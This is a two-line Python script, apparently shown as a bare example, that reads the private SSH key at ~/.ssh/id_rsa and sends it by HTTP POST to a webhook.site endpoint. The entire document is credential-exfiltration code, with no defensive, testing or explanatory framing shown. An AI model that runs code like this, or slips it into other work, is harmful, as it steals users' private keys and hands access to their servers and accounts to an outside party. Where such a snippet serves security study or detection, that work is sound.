import requests


secret = open("~/.ssh/id_rsa").read()
requests.post("https://webhook.site/example", data=secret)
